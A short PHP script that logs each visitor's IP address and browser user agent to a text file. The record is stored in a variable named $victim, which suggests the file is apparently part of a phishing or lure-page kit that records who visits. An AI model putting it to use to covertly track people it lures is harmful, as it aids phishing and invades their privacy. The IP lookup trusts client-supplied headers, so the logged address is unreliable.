<?php

// Function to get the IP address
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP']; // For shared Internet/ISP connections
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR']; // For proxies
    } else {
        return $_SERVER['REMOTE_ADDR']; // Regular IP address
    }
}

// Get the user's IP address
$ipaddress = getUserIP();

// Get the user agent (browser details)
$useragent = "User-Agent: " . $_SERVER['HTTP_USER_AGENT'];

// Prepare the information to be saved
$victim = "IP: " . $ipaddress . "\r\n" . $useragent . "\r\n";

// Path to the file where the information will be stored
$file = 'w/admin/database/ip.txt';

// Open the file for appending
$fp = fopen($file, 'a');

// Check if the file was opened successfully
if ($fp) {
    fwrite($fp, $victim); // Write the IP and user agent to the file
    fclose($fp); // Close the file after writing
} else {
    // If the file could not be opened, show an error message
    echo "Could not open file for writing.";
}

?>